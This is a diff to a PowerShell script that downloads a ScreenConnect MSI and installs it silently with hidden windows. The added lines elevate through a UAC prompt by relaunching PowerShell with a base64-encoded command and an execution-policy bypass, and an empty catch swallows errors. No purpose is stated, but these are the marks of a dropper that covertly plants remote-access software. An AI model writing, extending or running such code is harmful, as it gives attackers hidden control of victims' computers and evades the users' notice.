@@ -72,9 +72,20 @@ try {
     $wc2.DownloadFile($msiUrl, $msiPath)
 } catch {}
 
-# === 5. Execute ScreenConnect Silent Install ===
+# === 5. Execute ScreenConnect Silent Install (Admin Required) ===
 if (Test-Path $msiPath) {
-    Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
+    # Check if already running as admin
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    
+    if ($isAdmin) {
+        # Already admin - install directly
+        Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
+    } else {
+        # Need admin - re-launch with UAC elevation
+        $installCmd = "Start-Process 'msiexec.exe' -ArgumentList '/i `"$msiPath`" /qn /norestart' -WindowStyle Hidden -Wait"
+        $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($installCmd))
+        Start-Process "powershell.exe" -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $encodedCmd" -Verb RunAs -Wait
+    }
 }
 
 # === 6. Cleanup MSI ===
